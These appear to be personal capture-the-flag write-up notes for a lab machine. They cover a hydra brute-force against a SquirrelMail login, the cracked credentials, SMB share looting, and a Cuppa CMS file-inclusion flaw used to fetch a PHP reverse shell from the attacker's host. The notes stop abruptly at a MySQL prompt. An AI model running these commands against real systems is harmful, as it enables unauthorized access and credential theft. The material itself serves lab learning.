Performed brute-force using hydra as user `milesdyson` and used the provided wordlist
```
hydra 10.10.220.13 -l 'milesdyson' -P anonymous/logs/log1.txt http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect" -t 64
```
![[Pasted image 20240822195842.png]]

Logged into squirrelmail and found an email in inbox from `skynet@skynet`
![[Pasted image 20240822200723.png]]

`milesdyson:cyborg007haloterminator` - squirrelmail
`milesdyson:)s{A&2Z=F^n_E.B``

With this credential, accessed `milesdyson`'s SMB share
```bash
smbclient -U 'milesdyson' \\\\10.10.192.189\\milesdyson 
```
```
recurse ON
prompt OFF
mget *
```

Found a file in the share `important.txt`
![[Pasted image 20240823124436.png]]

- Performed gobuster on http://10.10.192.189/45kra24zxs28v3yd and found /administrator directory for Cuppa CMS login 
- Found LFI vulnerability for Cuppa CMS that works on 
```txt
http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
```
- Hence, performed gobuster again on http://10.10.192.189/45kra24zxs28v3yd/administrator and found /alerts. 
- Confirmed LFI
![[Pasted image 20240823124708.png]]
This vulnerability also allows reading remote or local files. The description of vulnerability of [ExploitDB](https://www.exploit-db.com/exploits/25971) says that the PHP code will be evaluated (executed). 
- Started a local webserver to serve `php-reverse-shell.php`
- navigated to http://10.10.192.189/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.103.8:8888/php-reverse-shell.php
- got reverse shell as `www-data`
![[Pasted image 20240823125054.png]]
- /home/milesdyson
	- found `user.txt`
	- found backup script that backs up the `/var/www/html` directory
	- extracted backup.tgz on attacker's machine and found `configuration.php` containing cuppa CMS db password
	- `root:password123`
![[Pasted image 20240823130938.png]]

mysql> cuppa> cu_users

